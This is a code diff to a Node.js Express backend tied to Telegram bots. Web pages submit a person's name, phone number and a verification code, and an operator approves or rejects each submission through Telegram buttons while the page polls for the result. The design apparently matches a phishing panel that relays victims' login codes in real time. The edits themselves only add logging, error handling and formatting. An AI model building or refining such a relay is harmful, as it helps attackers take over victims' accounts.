@@ -65,25 +65,32 @@ async function answerCallback(bot, id) {
             { callback_query_id: id }
         );
     } catch (err) {
-        console.error(err.message);
+        console.error("Callback error:", err.message);
     }
 }
 
 // ---------------- WEBHOOK SETUP ----------------
 async function setWebhook(bot) {
     const url = `${BACKEND_DOMAIN}/telegram-webhook/${bot.botId}`;
-    await axios.get(
-        `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${url}`
-    );
+
+    try {
+        await axios.get(
+            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${url}`
+        );
+        console.log(`Webhook set: ${bot.botId}`);
+    } catch (err) {
+        console.error("Webhook error:", err.message);
+    }
 }
 
 async function initWebhooks() {
     for (const bot of bots) {
         await setWebhook(bot);
     }
+    console.log("✅ All webhooks initialized");
 }
 
-// ---------------- PHONE FLOW (USED BY YOUR PAGE) ----------------
+// ---------------- PHONE FLOW ----------------
 app.post('/submit-phone', (req, res) => {
     const { name, phone, botId } = req.body;
 
@@ -91,6 +98,7 @@ app.post('/submit-phone', (req, res) => {
     if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
     const requestId = uuidv4();
+
     approvedPhones[requestId] = null;
     requestBotMap[requestId] = botId;
 
@@ -107,7 +115,9 @@ app.post('/submit-phone', (req, res) => {
 });
 
 app.get('/check-phone/:requestId', (req, res) => {
-    res.json({ approved: approvedPhones[req.params.requestId] ?? null });
+    res.json({
+        approved: approvedPhones[req.params.requestId] ?? null
+    });
 });
 
 // ---------------- CODE FLOW ----------------
@@ -118,6 +128,7 @@ app.post('/submit-code', (req, res) => {
     if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
     const requestId = uuidv4();
+
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = botId;
 
@@ -134,7 +145,9 @@ app.post('/submit-code', (req, res) => {
 });
 
 app.get('/check-code/:requestId', (req, res) => {
-    res.json({ approved: approvedCodes[req.params.requestId] ?? null });
+    res.json({
+        approved: approvedCodes[req.params.requestId] ?? null
+    });
 });
 
 // ---------------- TELEGRAM WEBHOOK ----------------
@@ -147,29 +160,37 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
     const [action, requestId] = cb.data.split(':');
 
-    let msg = '';
+    if (!requestId) {
+        console.log("❌ Missing requestId in callback:", cb.data);
+        return res.sendStatus(200);
+    }
+
+    let message = '';
 
     if (action === 'phone_ok') {
         approvedPhones[requestId] = true;
-        msg = `Phone approved: ${requestId}`;
+        message = `Phone approved`;
     }
 
     if (action === 'phone_bad') {
         approvedPhones[requestId] = false;
-        msg = `Phone rejected: ${requestId}`;
+        message = `Phone rejected`;
     }
 
     if (action === 'code_ok') {
         approvedCodes[requestId] = true;
-        msg = `Code approved: ${requestId}`;
+        message = `Code approved`;
     }
 
     if (action === 'code_bad') {
         approvedCodes[requestId] = false;
-        msg = `Code rejected: ${requestId}`;
+        message = `Code rejected`;
     }
 
-    if (msg) await sendTelegramMessage(bot, msg);
+    if (message) {
+        await sendTelegramMessage(bot, message);
+    }
+
     await answerCallback(bot, cb.id);
 
     res.sendStatus(200);
@@ -179,7 +200,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 app.get('/debug/phones', (req, res) => res.json(approvedPhones));
 app.get('/debug/codes', (req, res) => res.json(approvedCodes));
 
-// ---------------- START ----------------
+// ---------------- START SERVER ----------------
 initWebhooks().then(() => {
     app.listen(PORT, () => {
         console.log(`🚀 Server running on ${PORT}`);
